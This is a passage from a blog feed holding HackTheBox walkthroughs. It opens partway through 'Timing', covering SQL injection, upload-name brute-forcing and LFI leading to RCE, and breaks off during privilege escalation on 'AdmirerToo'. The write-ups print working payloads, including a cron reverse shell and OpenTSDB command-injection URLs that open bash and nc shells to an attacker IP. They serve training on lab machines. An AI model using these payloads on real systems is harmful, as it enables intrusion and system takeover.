<p>At this point I have no way of moving forward that I can think of without a valid authenticated session on the website. So I continue to exploit the delay in response to enumerate valid usernames.</p>

<p>Eventually, I discovered a user with the name <strong>aaron</strong>. Testing for weak passwords, I was able to login to his account using the password <strong>aaron</strong>;</p>

<p><img src="/assets/img/20220209233629.png" alt="" /></p>

<p>Now with a valid account on the site, I can begin to exploit the previously discovered vulnerabilities.</p>

<p><br /></p>

<h4 id="popping-a-shell">Popping a Shell</h4>
<p><br /></p>

<p>Going to the “Edit profile” tab, I was given a form to update my profile info, which burp showed is being sent to the PHP file that was previously found to be vulnerable to <em>SQL Injection</em>;</p>

<p><img src="/assets/img/20220209233838.png" alt="" /></p>

<p><img src="/assets/img/20220209233921.png" alt="" /></p>

<p>A look at the <code class="language-plaintext highlighter-rouge">login.php</code> source showed that the role of a user is loaded from the column <code class="language-plaintext highlighter-rouge">role</code>. Using the SQL injection flaw, I set the role of <strong>aaron</strong> to <code class="language-plaintext highlighter-rouge">1</code>, making him an admin;</p>

<p><img src="/assets/img/20220209234448.png" alt="" /></p>

<p>I then logged out and logged back in, and I’m now working as an admin. This gave me access to the admin panel, and the <code class="language-plaintext highlighter-rouge">avatar_uploader.php</code> page that I can use to upload files;</p>

<p><img src="/assets/img/20220209234647.png" alt="" /></p>

<p>So I started analysing the source code of files involved in the upload. The code that process the uploaded file is <code class="language-plaintext highlighter-rouge">upload.php</code>, which restrict the extension of uploaded files to <code class="language-plaintext highlighter-rouge">.jpg</code> only. Uploaded files are saved in the web root at <code class="language-plaintext highlighter-rouge">images/uploads/</code>, but the filename is prefixed with a <em>seemingly</em> random token;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$file_hash</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">();</span>
<span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s1">'$file_hash'</span> <span class="mf">.</span> <span class="nb">time</span><span class="p">())</span> <span class="mf">.</span> <span class="s1">'_'</span> <span class="mf">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
<span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="mf">.</span> <span class="nv">$file_name</span><span class="p">;</span>
<span class="nv">$error</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="no">PATHINFO_EXTENSION</span><span class="p">));</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The function <code class="language-plaintext highlighter-rouge">uniqid()</code> returns a 13 character long alphanumeric string based on the current system time in milliseconds. But notice that in the second line, the value is passed to the call to <code class="language-plaintext highlighter-rouge">md5()</code> as <code class="language-plaintext highlighter-rouge">'$file_hash'</code> enclosed in single quotes. In PHP, this will pass the literal string <code class="language-plaintext highlighter-rouge">$file_hash</code>, instead of the value the variable contains. This makes bruteforcing this token a lot easier since we only need to target the output of <code class="language-plaintext highlighter-rouge">time()</code>, which is the current epoch time in seconds.</p>

<p>With all this info, I made a simple python script that will generate possible names an uploaded file is saved as, and used <code class="language-plaintext highlighter-rouge">ffuf</code> to locate it. I saved the below script as <code class="language-plaintext highlighter-rouge">make_paths.py</code>;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------------------------------------
#   A script for generating the possible image upload paths in Timing (HackTheBox).
# To be executed immediately after uploading a file named "test.jpg", then pipe
# the output to file which you can use as bruteforce wordlist with tools like ffuf.
#   This was tested with timezone set to WAT (UTC + 1), so you may need to modify the
# script to suit yours.
#                                                   Author: https://4g3nt47.github.io
#------------------------------------------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>

<span class="n">stime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">())</span> <span class="c1"># The starting time
</span><span class="n">filename</span> <span class="o">=</span> <span class="s">"test.jpg"</span> <span class="c1"># The basename of the file uploaded.
</span>
<span class="k">def</span> <span class="nf">hashstr</span><span class="p">(</span><span class="n">val</span><span class="p">):</span> <span class="c1"># Return an md5 hash of a string.
</span>  <span class="k">return</span> <span class="n">md5</span><span class="p">(</span><span class="n">val</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"UTF-8"</span><span class="p">)).</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">300</span><span class="p">):</span> <span class="c1"># Generate candidates for 5 minute
</span>  <span class="n">path</span> <span class="o">=</span> <span class="s">"images/uploads/"</span> <span class="o">+</span> <span class="n">hashstr</span><span class="p">(</span><span class="s">"$file_hash"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">stime</span><span class="p">))</span> <span class="o">+</span> <span class="s">"_"</span> <span class="o">+</span> <span class="n">filename</span>
  <span class="k">print</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
  <span class="n">stime</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1"># Go back 1 second in time
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>I probably need to sync my time with the box, but I don’t see NTP running on the host (port 123). So I generated a bind shell because the host is blocking all outgoing connections (I figured this out after a couple of tests) and saved it as <code class="language-plaintext highlighter-rouge">test.jpg</code>;</p>

<p><img src="/assets/img/20220210000559.png" alt="" /></p>

<p>I uploaded it to the site, and immediately run the <code class="language-plaintext highlighter-rouge">make_paths.py</code> script to generate possible paths and save as <code class="language-plaintext highlighter-rouge">paths.txt</code>. I then used <code class="language-plaintext highlighter-rouge">ffuf</code> to find the valid path with threads set to <code class="language-plaintext highlighter-rouge">1</code> because the order is important. It worked!</p>

<p><img src="/assets/img/20220210001107.png" alt="" /></p>

<p>Now that I can write files, and find out exactly where they are stored, I can use the previously discovered LFI on <code class="language-plaintext highlighter-rouge">image.php</code> to run my own code;</p>

<p><img src="/assets/img/20220210001337.png" alt="" /></p>

<p>This gave me a shell on the box as <code class="language-plaintext highlighter-rouge">www-data</code>;</p>

<p><img src="/assets/img/20220210001353.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>In the root of the web app, I found a database password in the file <code class="language-plaintext highlighter-rouge">db_conn.php</code>, and there is a MySQL service running locally on port <strong>3306</strong>;</p>

<p><img src="/assets/img/20220210001644.png" alt="" /></p>

<p>I found the hashed password of the <strong>admin</strong> user in the database, but it was taking too long to crack with <code class="language-plaintext highlighter-rouge">john</code>, so I moved on.</p>

<p><img src="/assets/img/20220210001837.png" alt="" /></p>

<p>Listing the <code class="language-plaintext highlighter-rouge">/home</code> directory showed that a local user named <strong>aaron</strong> exist. Testing his password for the web app on the local account (<em>aaron</em>) did not work.</p>

<p>Looking through the filesystem, I found an interesting file at <code class="language-plaintext highlighter-rouge">/opt/source-files-backup.zip</code>, which I extracted to <code class="language-plaintext highlighter-rouge">/dev/shm</code> for analysis. The file appears to contain the backup of all the source code of the web app. A <code class="language-plaintext highlighter-rouge">.git</code> directory exists in the root of the folder, which indicate it’s a git repository.</p>

<p>The box has <code class="language-plaintext highlighter-rouge">git</code> installed, so I ran <code class="language-plaintext highlighter-rouge">git log</code> to show previous commits;</p>

<p><img src="/assets/img/20220210002452.png" alt="" /></p>

<p>The commit message of the last commit looks interesting, so I ran <code class="language-plaintext highlighter-rouge">git diff</code> on it to see the changes made. I was rewarded with a password;</p>

<p><img src="/assets/img/20220210002622.png" alt="" /></p>

<p>Testing the password against the account of <strong>aaron</strong>, I gained access;</p>

<p><img src="/assets/img/20220210002707.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>aaron</strong> has <strong>sudo</strong> permissions on the file <code class="language-plaintext highlighter-rouge">/usr/bin/netutils</code>, which is a simple bash script that calls a Java program located in the home directory of the root user;</p>

<p><img src="/assets/img/20220210003026.png" alt="" /></p>

<p>The program is a download utility that prompts for protocol and URL. Using the HTTP protocol, I was able to download a file from my attack host. This is when I realised I could connect to my box over port <strong>80</strong>, which previously didn’t work when I was trying to gain a foothold on the box. After exiting the program, I realised that the file is downloaded to my current working directory, and saved as root. This could allow me to write to any directory I can <code class="language-plaintext highlighter-rouge">cd</code> into.</p>

<p>My first attempt was to create a cron job by writing to <code class="language-plaintext highlighter-rouge">/etc/cron.d</code>. This is important because cron files do not need to have execute permission, which I can’t set because the file ownership will be assigned to root. This didn’t work because at first because I messed up the syntax of the cron file I uploaded. After some tests locally on my box, I created a file named <code class="language-plaintext highlighter-rouge">mycron</code> with the contents;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root /bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.53/443 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I then start a HTTP server locally on my box to host the cron file, and then moved into <code class="language-plaintext highlighter-rouge">/etc/cron.d</code> (in the target box) and download the file. I then started a listener on port <strong>443</strong>, and received a privileged reverse shell after about a minute;</p>

<p><img src="/assets/img/20220210004334.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified port <strong>22</strong> and <strong>80</strong>.</li>
  <li>Identified a time delay in the web login when submitting valid username.</li>
  <li>Bruteforced a file <code class="language-plaintext highlighter-rouge">/image.php</code> in the web root.
    <ul>
      <li>Bruteforced a GET parameter <code class="language-plaintext highlighter-rouge">img</code>, which was found to be vulnerable to LFI.</li>
    </ul>
  </li>
  <li>Discovered a user named <strong>aaron</strong> that uses the password <strong>aaron</strong>.
    <ul>
      <li>Exploited an <em>SQL Injection</em> flaw to elevate to admin in the site.</li>
      <li>Chained an <em>arbitrary file upload</em> and an <em>LFI</em>  flaw to gain <em>RCE</em>.</li>
    </ul>
  </li>
  <li>Inside as <strong>www-data</strong>
    <ul>
      <li>Recovered a password in a previous git commit, which gave me access to the account of <strong>aaron</strong> over SSH.</li>
    </ul>
  </li>
  <li>Inside as <strong>aaron</strong>
    <ul>
      <li>Identified a <em>sudo</em> permission on a script that allows for file download to working directory as root.</li>
      <li>Used it to create a cron task by writing to <code class="language-plaintext highlighter-rouge">/etc/con.d</code> to gain code execution as root.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="bruteforce" /><category term="filter bypass" /><category term="static analysis" /><category term="php" /><category term="authentication bypass" /><category term="enumeration" /><category term="sql injection" /><category term="arbitrary file upload" /><category term="git" /><category term="suid" /><category term="cron" /><summary type="html"><![CDATA[Timing is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the application to identify a broken authentication logic, an SQL injection flaw to elevate to the website admin, and then an RCE via file upload. User access is through a password reuse, which you recover from a previous git commit. Privesc targets a custom SUID script that runs a Java program, which allows you to write arbitrary files in any directory you can enter.]]></summary></entry><entry><title type="html">AdmirerToo - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" rel="alternate" type="text/html" title="AdmirerToo - HackTheBox" /><published>2022-05-29T00:00:00+01:00</published><updated>2022-05-29T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/admirertoo</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html"><![CDATA[<p><strong>AdmirerToo</strong> is a hard-rated linux box. It starts with an SSRF exploit on <em>Adminer</em> to access an instance of <em>OpenTSDB</em> on port <strong>4242</strong>, which is vulnerable to RCE. This will give you a shell on the box as <code class="language-plaintext highlighter-rouge">opentsdb</code>, which you can use to extract credentials from a configuration file and gain access to the account of <code class="language-plaintext highlighter-rouge">jennifer</code> due to password reuse. An instance of <em>OpenCATS</em> is running locally on port <strong>8080</strong>, which you can access by setting up an SSH tunnel. <em>OpenCATS</em> is running as the user <code class="language-plaintext highlighter-rouge">devel</code>, who has write permissions on the directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, and is vulnerable <em>object injection</em> that you can use to write files in the directory, and exploit the <em>Fail2Ban</em> service to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220212113822.png" alt="" /></p>

<p><img src="/assets/img/20220212113838.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Sat Feb 12 11:41:17 2022 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.137
Increasing send delay for 10.10.11.137 from 0 to 5 due to 192 out of 638 dropped probes since last increase.
Nmap scan report for admirertoo.htb (10.10.11.137)
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp   open     http           Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Admirer
4242/tcp filtered vrml-multi-use
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 12 11:42:38 2022 -- 1 IP address (1 host up) scanned in 80.99 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/20220212114740.png" alt="" /></p>

<p>This is a PHP site due to presence of <code class="language-plaintext highlighter-rouge">/index.php</code>. The chat bubble in the homepage sent a request to the index page, but the request does not seem to be processed by the server as there are no changes in response;</p>

<p><img src="/assets/img/20220212115359.png" alt="" /></p>

<p>Requesting a non-existing page leaked a possible domain;</p>

<p><img src="/assets/img/20220212120040.png" alt="" /></p>

<p>I updated my hosts file with it, and reload the page. Nothing changed.</p>

<p>Fuzzing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code>, I got a hit;</p>

<p><img src="/assets/img/20220212120534.png" alt="" /></p>

<p><br /></p>

<h4 id="dbadmirer-galleryhtb">db.admirer-gallery.htb</h4>
<p><br /></p>

<p><img src="/assets/img/20220212120952.png" alt="" /></p>

<p>Clicking the <em>enter</em> button, I was login to a database management service like <em>phpMyAdmin</em> as the user <strong>admirer_ro</strong>;</p>

<p><img src="/assets/img/20220212121927.png" alt="" /></p>

<p>I have access to the database <strong>gallery</strong>, but I can’t make any changes to it;</p>

<p><img src="/assets/img/20220212122014.png" alt="" /></p>

<p>Going to the <em>privileges</em> menu from the homepage, I was able to read the password hash of the <strong>admirer_ro</strong> user;</p>

<p><img src="/assets/img/20220212123348.png" alt="" /></p>

<p>The password hash could not be cracked using <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, so I moved on.</p>

<p>However, I did not enter any password to login to the service, so I looked through my traffic in burp, and found a password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>;</p>

<p><img src="/assets/img/20220212123541.png" alt="" /></p>

<p>Looking at the source code of the login page, I found even more useful info;</p>

<p><img src="/assets/img/20220212124001.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="adminer">Adminer</h3>
<p><br /></p>

<blockquote>
  <p>Adminer is a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Its author is Jakub Vrána who started to develop this tool as a light-weight alternative to phpMyAdmin, in July 2007.</p>
</blockquote>

<p>The service has support for custom plugins, which are installed in the <code class="language-plaintext highlighter-rouge">/plugins</code> directory;</p>

<p><img src="/assets/img/20220214094555.png" alt="" /></p>

<p>My first attempt at exploiting this service is to get it to authenticate to my own MySQL server, which may let me read local files on the server running <em>adminer</em> into my own database. So I created a database named <code class="language-plaintext highlighter-rouge">admirer</code>, and add a user to it with the username <code class="language-plaintext highlighter-rouge">admirer_ro</code> and password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>.</p>

<p>Using burp’s <em>intercept</em>, I passed all the relevant config to the server;</p>

<p><img src="/assets/img/20220214083419.png" alt="" /></p>

<p>This didn’t work, and the login page displayed an error message;</p>

<p><img src="/assets/img/20220214083631.png" alt="" /></p>

<p>So I repeat the process with a wrong password to see if I can get a different response. I did;</p>

<p><img src="/assets/img/20220214083855.png" alt="" /></p>

<p>This indicate the first login attempt was likely successful. So I fired up <em>Wireshark</em> to see what exactly is going on.</p>

<p>As you can see from the following packets, the box did manage to successfully authenticate to my MySQL database;</p>

<p><img src="/assets/img/20220214084810.png" alt="" /></p>

<p>However, the client exited using the <code class="language-plaintext highlighter-rouge">quit</code> (the last highlighted packet) command after the authentication has been completed. I have no clue why this is happening, may be the service is doing some sort of validation?</p>

<p>Another thing I saw while going through the packets is support for <code class="language-plaintext highlighter-rouge">LOAD DATA LOCAL</code> command by the client, which is a command I could use to read local files on the box should the server allow it;</p>

<p><img src="/assets/img/20220214085622.png" alt="" /></p>

<p>After the MySQL session was closed, my box made a HTTP request to the server, and was given a <strong>403 Forbidden</strong> response;</p>

<p><img src="/assets/img/20220214090602.png" alt="" /></p>

<p>My guess is this is somehow interfering with the web login. The cookies look very interesting, so I started studying them. The cookie <code class="language-plaintext highlighter-rouge">adminer_permanent</code> is a URL-encoded base64-string;</p>

<p><img src="/assets/img/20220214091542.png" alt="" /></p>

<p>The cookie contains the database host, database name, and database username. The cookies <code class="language-plaintext highlighter-rouge">adminer_key</code> and <code class="language-plaintext highlighter-rouge">adminer_sid</code> look interesting, but I have no idea what they are. So I decided to install <em>Adminer</em> locally on my box in hope of learning more about them.</p>

<p>I installed <em>Adminer</em> in a docker container along with a MySQL server, then I configured another MySQL service on my main host. In both databases, I created a database named <code class="language-plaintext highlighter-rouge">admirer</code> and created a user for it named <code class="language-plaintext highlighter-rouge">admirer_ro</code> with the passwords set to <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>. Interestingly, my approach worked locally, and I was able to get the <em>Adminer</em> service in my docker container to connect to the database on my main host. I have no clue why it’s not working on the box, so I just moved on.</p>

<p>Searching for exploits for the version of adminer running, I found this at https://github.com/advisories/GHSA-x5r2-hj5c-8jx6;</p>

<p><img src="/assets/img/20220214154948.png" alt="" /></p>

<p>The version of Adminer running on the host is vulnerable to SSRF. The PoC is in a linked PDF. It links to a python script at https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd, which can be used to setup the redirect.</p>

<p>SSRF flaws are mainly used to access internal resources, or resources we are not allowed to directly access. Going back to my initial port scan, NMAP reported port <strong>4242</strong> as <em>filtered</em>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>---[snip]---
|_http-title: Admirer
4242/tcp filtered vrml-multi-use
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
---[snip]---
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So I setup the redirection script to redirect requests to my box on port <strong>80</strong> to the filtered service at http://127.0.0.1:4242. I then send a login request with the server set to my box and driver set to <em>elastic</em> (for Elasticsearch);</p>

<p><img src="/assets/img/20220214161416.png" alt="" /></p>

<p><img src="/assets/img/20220214161606.png" alt="" /></p>

<p>This worked, and I got a response from the hidden service;</p>

<p><img src="/assets/img/20220214161741.png" alt="" /></p>

<p>It seems the service supports the HTTP protocol. The title <strong>OpenTSDB</strong> looks interesting, so I started googling it;</p>

<blockquote>
  <p><strong>OpenTSDB</strong> is <em>a distributed, scalable Time Series Database</em> (TSDB) written on top of HBase. OpenTSDB was written to address a common need: store, index and serve metrics collected from computer systems (network gear, operating systems, applications) at a large scale, and make this data easily accessible and graphable.</p>
</blockquote>

<p>Seaching for known exploits for this service, I found a <em>Command Injection</em> vulnerability at https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yaml</p>

<p>Using the PoC provided that runs a <code class="language-plaintext highlighter-rouge">wget</code> command, I got a long error message about a missing “metric”;</p>

<p><img src="/assets/img/20220214164802.png" alt="" /></p>

<p>Googling on what exactly a “metric” is in this service, I learned that;</p>

<blockquote>
  <p>In OpenTSDB, a metric is <strong>named with a string</strong>, like http. hits . To be able to store all the different values for all the places where this metric exists, you tag the data with one or more tags when you send them to the TSD. TSD stores the timestamp, the value, and the tags.</p>
</blockquote>

<p>There is a way to list available metrics using the query <code class="language-plaintext highlighter-rouge">/api/suggest?type=metrics</code>. Using it on the host returned one entry <code class="language-plaintext highlighter-rouge">http.stats.web.hits</code>;</p>

<p><img src="/assets/img/20220214165423.png" alt="" /></p>

<p>So I updated the exploit using this metric;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27nc%2010.10.16.53%20443%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And bingo!!!</p>

<p><img src="/assets/img/20220214170430.png" alt="" /></p>

<p>I used this exploit to spawn a shell on the box as <strong>opentsdb</strong> user;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.53%2F443%200%3E%261%22%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220215033044.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Local user with the name <strong>jennifer</strong> exists. The user I am working as is not part of any groups. <code class="language-plaintext highlighter-rouge">linPEAS</code> found some creds;</p>

<p><img src="/assets/img/20220215034950.png" alt="" /></p>

<p>This creds were found in the file <code class="language-plaintext highlighter-rouge">/etc/opencats/config.php</code>. I was able to login to the local MySQL server using it;</p>

<p><img src="/assets/img/20220215035343.png" alt="" /></p>

<p>This user has access to only one database, which contains the below tables;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>+--------------------------------------+
| Tables_in_cats_dev                   |
+--------------------------------------+
---[snip]---
| site                                 |
| sph_counter                          |
| system                               |
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The table <code class="language-plaintext highlighter-rouge">user</code> looks interesting, and was found to contain some hashes;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>MariaDB [cats_dev]&gt; select user_id, email, user_name, password from user;
+---------+-------------------------+----------------+----------------------------------+
| user_id | email                   | user_name      | password                         |
+---------+-------------------------+----------------+----------------------------------+
|       1 | admin@testdomain.com    | admin          | dfa2a420a4e48de6fe481c90e295fe97 |
|    1250 | 0                       | cats@rootadmin | cantlogin                        |
|    1251 | jennifer@admirertoo.htb | jennifer       | f59f297aa82171cc860d76c390ce7f3e |
+---------+-------------------------+----------------+----------------------------------+
3 rows in set (0.001 sec)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I was unable to crack any of the hashes using the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist with <code class="language-plaintext highlighter-rouge">john</code>, so I moved on.</p>

<p>The box doesn’t allow to me to list the processes of other users, only mine;</p>

<p><img src="/assets/img/20220215091250.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">pspy</code> also didn’t help, so we are probably in a jailed environment.</p>

<p>There are a few other ports listening;</p>

<p><img src="/assets/img/20220215091442.png" alt="" /></p>

<p>The service on port <strong>8080</strong> caught my attention. This is a port normally used by web proxies, so I tried to use it with <code class="language-plaintext highlighter-rouge">curl</code> to make a request, but it didn’t work;</p>

<p><img src="/assets/img/20220215093108.png" alt="" /></p>

<p>It keeps closing connections about one second after they were established, even without sending any data.</p>

<p>Looking at the <code class="language-plaintext highlighter-rouge">/opt</code> directory, I saw 2 directories owned by the <code class="language-plaintext highlighter-rouge">root</code> user;</p>

<p><img src="/assets/img/20220215093232.png" alt="" /></p>

<p>A quick search in <code class="language-plaintext highlighter-rouge">searchsploit</code> showed 2 vulns for <em>OpenCATS</em>;</p>

<p><img src="/assets/img/20220215093404.png" alt="" /></p>

<p>This is a <em>free open-source applicant tracking system (ATS).</em>, with documentation at https://opencats-documentation.readthedocs.io/</p>

<p>After further enumeration of the filesystem, the file <code class="language-plaintext highlighter-rouge">/var/www/adminer/plugins/data/server.php</code> was found to contain the configuration of the <em>one-click login</em> plugin installed in Adminer. The file contains a commented-out password, which turns out to be the password of <strong>jennifer</strong>. This was easier than I expected;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">return</span> <span class="p">[</span>
  <span class="s1">'localhost'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
<span class="c1">//    'username' =&gt; 'admirer',</span>
<span class="c1">//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',</span>
<span class="c1">// Read-only account for testing</span>
    <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'admirer_ro'</span><span class="p">,</span>
    <span class="s1">'pass'</span>     <span class="o">=&gt;</span> <span class="s1">'1w4nn4b3adm1r3d2!'</span><span class="p">,</span>
    <span class="s1">'label'</span>    <span class="o">=&gt;</span> <span class="s1">'MySQL'</span><span class="p">,</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
      <span class="s1">'admirer'</span> <span class="o">=&gt;</span> <span class="s1">'Admirer DB'</span><span class="p">,</span>
    <span class="p">)</span>
  <span class="p">),</span>
<span class="p">];</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This password gave me access to the box over SSH as <strong>jennifer</strong>;</p>

<p><img src="/assets/img/20220215094647.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><strong>jennifer</strong> does not have <code class="language-plaintext highlighter-rouge">sudo</code> permissions on the box, and I still cannot list running processes belonging to other users.</p>

<p>Looking for attack vectors, I noticed the modification date of <code class="language-plaintext highlighter-rouge">/usr/bin/pkexec</code> dates back to <strong>15 Jan 2019</strong>. This indicate it may be vulnerable to the <em>pwnkit</em> exploit. Searching for exploits, I found one at https://github.com/ly4k/PwnKit. Testing the exploit on the box, I was elevated to root immediately. This is way too easy for a <strong>hard</strong> box, so I contacted a staff through the HTB discord, and found out it is indeed unintended. So I switched back to <strong>jennifer</strong>, and started looking for the intended way.</p>

